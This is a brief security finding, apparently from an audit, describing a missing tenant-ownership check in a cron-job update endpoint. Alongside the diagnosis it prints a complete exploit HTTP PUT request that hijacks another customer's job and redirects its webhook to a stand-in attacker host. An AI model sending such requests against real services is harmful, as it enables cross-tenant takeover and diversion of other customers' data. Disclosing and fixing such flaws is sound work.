diagnosis: The endpoint updates an in-memory node-cron task definition by jobId without validating that the authenticated API key's tenantId matches the owner of the job. Any customer can hijack another customer's scheduled cron job to trigger requests against arbitrary URLs or alter its execution frequency.
exploit_request:
PUT /api/cron-jobs/cron_order_sync_88910 HTTP/1.1
Host: cron.saascloud.io
X-API-Key: live_key_attacker_01
Content-Type: application/json

{"cronExpression": "*/1 * * * *", "webhookUrl": "https://attacker.com/sink"}
